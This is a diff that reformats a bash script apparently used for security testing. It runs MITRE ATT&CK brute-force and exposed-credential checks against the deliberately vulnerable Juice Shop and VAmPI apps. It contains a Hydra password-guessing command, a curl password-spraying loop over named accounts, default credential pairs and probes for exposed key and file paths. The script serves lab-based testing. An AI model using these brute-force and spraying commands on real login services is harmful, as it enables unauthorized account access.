@@ -15,7 +15,7 @@ echo "=== T1110.001: Brute Force — Password Guessing ==="
 echo "    Technique: Automated password guessing against login endpoints"
 
 echo "  [T1110.001.a] Hydra against Juice Shop REST API:"
-echo "admin@juice-sh.op" > /tmp/mitre-users-$$.txt
+echo "admin@juice-sh.op" >/tmp/mitre-users-$$.txt
 hydra -L /tmp/mitre-users-$$.txt \
   -P /opt/seclists/Passwords/Common-Credentials/best15.txt \
   "$TARGET" http-post-form \
@@ -35,7 +35,8 @@ echo "  Spraying '${SPRAY_PASS}' against known Juice Shop accounts:"
 for user in "admin@juice-sh.op" "jim@juice-sh.op" "bender@juice-sh.op" "mc.safesearch@juice-sh.op" "ciso@juice-sh.op"; do
   code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/juice-shop/rest/user/login" \
     -H "Content-Type: application/json" -d "{\"email\":\"${user}\",\"password\":\"${SPRAY_PASS}\"}" --max-time 10) || code="ERR"
-  tag="[SAFE]"; [[ "$code" == "200" ]] && tag="[VULN]"
+  tag="[SAFE]"
+  [[ "$code" == "200" ]] && tag="[VULN]"
   printf "  %s %s -> HTTP %s\n" "$tag" "$user" "$code"
 done
 echo ""
@@ -50,10 +51,12 @@ CRED_PAIRS=(
   "admin@juice-sh.op:password"
 )
 for pair in "${CRED_PAIRS[@]}"; do
-  user="${pair%%:*}"; pass="${pair##*:}"
+  user="${pair%%:*}"
+  pass="${pair##*:}"
   code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/juice-shop/rest/user/login" \
     -H "Content-Type: application/json" -d "{\"email\":\"${user}\",\"password\":\"${pass}\"}" --max-time 10) || code="ERR"
-  tag="[SAFE]"; [[ "$code" == "200" ]] && tag="[VULN]"
+  tag="[SAFE]"
+  [[ "$code" == "200" ]] && tag="[VULN]"
   printf "  %s %s:%s -> HTTP %s\n" "$tag" "$user" "$pass" "$code"
 done
 echo ""
@@ -62,7 +65,8 @@ echo "=== T1552.001: Unsecured Credentials — In Files ==="
 echo "    Technique: Sensitive data in exposed files"
 for path in "/juice-shop/ftp/" "/juice-shop/encryptionkeys/" "/juice-shop/robots.txt" "/juice-shop/.well-known/security.txt" "/juice-shop/api-docs/" "/vampi/openapi.json" "/vampi/console"; do
   code=$(curl -sf -o /dev/null -w "%{http_code}" "${BASE}${path}" --max-time 10) || code="ERR"
-  tag="[INFO]"; [[ "$code" == "200" ]] && tag="[VULN]"
+  tag="[INFO]"
+  [[ "$code" == "200" ]] && tag="[VULN]"
   printf "  %s %s -> HTTP %s\n" "$tag" "$path" "$code"
 done
 echo ""
